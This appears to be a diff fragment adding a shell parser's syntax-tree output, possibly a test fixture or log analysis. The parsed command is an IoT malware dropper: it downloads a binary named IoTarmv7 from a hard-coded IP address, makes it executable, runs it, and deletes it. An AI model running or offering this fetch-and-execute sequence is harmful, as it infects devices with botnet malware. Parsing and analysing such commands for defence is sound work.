+  CommandNode(lineno=14, pos=(1738, 1771), parts=[
+    WordNode(lineno=14, pos=(1738, 1742), word='wget'),
+    WordNode(lineno=14, pos=(1743, 1771), word='http://149.56.97.35/IoTarmv7'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1771, 1772)),
+  CommandNode(lineno=14, pos=(1773, 1790), parts=[
+    WordNode(lineno=14, pos=(1773, 1778), word='chmod'),
+    WordNode(lineno=14, pos=(1779, 1781), word='+x'),
+    WordNode(lineno=14, pos=(1782, 1790), word='IoTarmv7'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1790, 1791)),
+  CommandNode(lineno=14, pos=(1792, 1802), parts=[
+    WordNode(lineno=14, pos=(1792, 1802), word='./IoTarmv7'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1802, 1803)),
+  CommandNode(lineno=14, pos=(1804, 1819), parts=[
+    WordNode(lineno=14, pos=(1804, 1806), word='rm'),
+    WordNode(lineno=14, pos=(1807, 1810), word='-rf'),
+    WordNode(lineno=14, pos=(1811, 1819), word='IoTarmv7'),
+  ]),
+])
